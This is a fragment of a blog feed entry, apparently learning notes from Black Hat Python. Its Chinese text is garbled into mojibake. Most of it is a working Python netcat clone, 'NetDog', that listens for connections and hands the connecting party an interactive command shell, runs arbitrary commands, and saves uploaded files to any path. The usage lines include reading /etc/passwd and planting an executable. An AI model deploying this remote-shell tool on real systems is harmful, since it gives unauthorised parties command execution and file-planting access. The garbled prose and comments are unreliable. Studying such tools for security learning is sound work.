class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys         <span class="comment"># è°ƒç”¨ç³»ç»Ÿå‡½æ•°</span></span><br><span class="line"><span class="keyword">import</span> socket      <span class="comment"># å»ºç«‹TCPè¿æ¥</span></span><br><span class="line"><span class="keyword">import</span> getopt      <span class="comment"># è·å–å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line"><span class="keyword">import</span> threading   <span class="comment"># å¤šçº¿ç¨‹</span></span><br><span class="line"><span class="keyword">import</span> subprocess  <span class="comment"># å¤„ç†å‘½ä»¤ï¼Œè¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰å…¨å±€å˜é‡</span></span><br><span class="line">target              = <span class="string">""</span></span><br><span class="line">port                = <span class="number">0</span></span><br><span class="line">listen              = <span class="literal">False</span></span><br><span class="line">execute             = <span class="string">""</span></span><br><span class="line">command             = <span class="literal">False</span></span><br><span class="line">upload              = <span class="literal">False</span></span><br><span class="line">upload_destination  = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸®åŠ©ä¿¡æ¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"NetDog Tool"</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: netdog.py -t target_host -p port"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-l --listen              - listen on [host]:[port] for incoming connections"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connection"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-c --command             - initialize a command shell"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-u --upload=destination  - upon receiving connection upload a file and write to [destination]"</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Examples: "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"netdog.py -t 192.168.0.1 -p 5555 -l -c"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"netdog.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"netdog.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"echo 'ABCDEFGHI' | ./netdog.py -t 192.168.11.12 -p 135"</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">"t:p:u:e:hlc"</span>, [<span class="string">"target"</span>, <span class="string">"port"</span>, <span class="string">"upload"</span>, <span class="string">"execute"</span>, <span class="string">"help"</span>, <span class="string">"listen, command"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> str(err)</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¯»å–å‘½ä»¤è¡Œé€‰é¡¹ï¼Œæ ¹æ®é€‰é¡¹ç»™ç›¸åº”çš„å…¨å±€å˜é‡å˜é‡åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">for</span> option_name, option_value <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> option_name <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = option_value</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = option_value</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = option_value</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(option_value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">"Unkonw Option"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¸å¤„äºç›‘å¬æ¨¡å¼æ—¶</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line">        buffer_str = sys.stdin.read()</span><br><span class="line">        client_sender(buffer_str)</span><br><span class="line">    <span class="comment"># å¤„äºç›‘å¬æ¨¡å¼æ—¶</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€æ¶ˆæ¯ï¼Œå¹¶å°†è¿”å›ç»“æœæ‰“å°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer_str)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        <span class="keyword">if</span> len(buffer_str):</span><br><span class="line">            client.send(buffer_str)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response += data</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> response,</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ç»§ç»­è·å–è¾“å…¥ï¼Œä¸ºäº†ä¸å‘½ä»¤è¡ŒåŒ¹é…åŠ ä¸Šæ¢è¡Œç¬¦</span></span><br><span class="line">            buffer_str = raw_input(<span class="string">""</span>)</span><br><span class="line">            buffer_str += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            client.send(buffer_str)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Exception! Exiting."</span></span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç›‘å¬å¾ªç¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœæ²¡æœ‰æŒ‡å®šipï¼Œé»˜è®¤ä¸ºç›‘å¬æœ¬æœºip</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target, port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># å½“æœ‰å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼ŒæŒ‚èµ·ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰§è¡Œclient_handler((client_socket))å‡½æ•°</span></span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œä»å®¢æˆ·ç«¯è·å–çš„å‘½ä»¤ï¼Œè¿”å›æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“æœ‰å®¢æˆ·ç«¯è¿æ¥ä¹‹åï¼Œæ ¹æ®å‘½ä»¤è¡Œé€‰é¡¹æ‰§è¡Œä¸åŒçš„åŠŸèƒ½</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¸Šä¼ æ–‡ä»¶è‡³æŒ‡å®šè·¯å¾„</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination, <span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span> % upload_destination)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span> % upload_destination)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ‰§è¡Œå‘½ä»¤ï¼Œè¿”å›ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¿”å›ä¸€ä¸ªshell</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">"&lt;netdog:#&gt; "</span>)</span><br><span class="line"></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            response = run_command(cmd_buffer)</span><br><span class="line">            client_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œæ¼”ç¤ºï¼š</strong></p><h3 id="å¼€å§‹ç•Œé¢"><a href="#å¼€å§‹ç•Œé¢" class="headerlink" title="å¼€å§‹ç•Œé¢"></a>å¼€å§‹ç•Œé¢</h3><p><img src="https://i.loli.net/2019/07/23/5d368cd668ebe65612.png" alt=""></p><h3 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h3><p><img src="https://i.loli.net/2019/07/23/5d368d2b9ea8439905.png" alt=""></p><p><strong>æ³¨æ„ï¼šæœªæŒ‡å®š<code>-t target</code>é»˜è®¤æ˜¯ç›‘å¬æœ¬æœºï¼Œå¦å¤–è¿æ¥æ—¶ï¼Œè¾“å…¥å®Œå‘½ä»¤éœ€è¦æ‰‹åŠ¨<code>CTRL+D</code>è¾“å…¥è¯­å¥ç»“æŸç¬¦ï¼Œæ‰èƒ½è¿æ¥åˆ°shell</strong></p><h3 id="å‘é€HTTPè¯·æ±‚"><a href="#å‘é€HTTPè¯·æ±‚" class="headerlink" title="å‘é€HTTPè¯·æ±‚"></a>å‘é€HTTPè¯·æ±‚</h3><p>ä¸‹é¢æˆ‘ä»¬è¯•è¯•ç”¨<code>netdog</code>å‘é€HTTPè¯·æ±‚ï¼Œè·å–<code>www.baidu.com</code>çš„å“åº”ï¼š</p><p><img src="https://i.loli.net/2019/07/23/5d368f10e91a961389.png" alt=""></p><p><strong><em>æˆåŠŸ~</em></strong></p><h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><p>ã€Š<em>Black hat Python: Python Programming for Hackers and Pentesters</em>ã€‹<strong>P1~P21</strong></p><p><strong>PSï¼šnetdogæ˜¯éšä¾¿å–çš„ï¼Œä»…ç”¨äºå­¦ä¹ æ—¶æ–¹ä¾¿è®°å¿†ï¼Œä¾µåˆ ï¼</strong></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åˆšå¼€å§‹å­¦ä¹ ï¼Œåªå­¦äº†ç‚¹çš®æ¯›ï¼Œç»§ç»­åŠ æ²¹å§ = =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘åœ¨å­¦ä¹ pythonç½‘ç»œè„šæœ¬ç¼–å†™ï¼Œåˆ©ç”¨tcpå®¢æˆ·ç«¯/æœåŠ¡å™¨å­¦ä¹ ç¼–å†™äº†ä¸€ä¸ªä»£æ›¿netcat(ç®€é™‹)çš„å·¥å…·ï¼Œè®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
</feed>
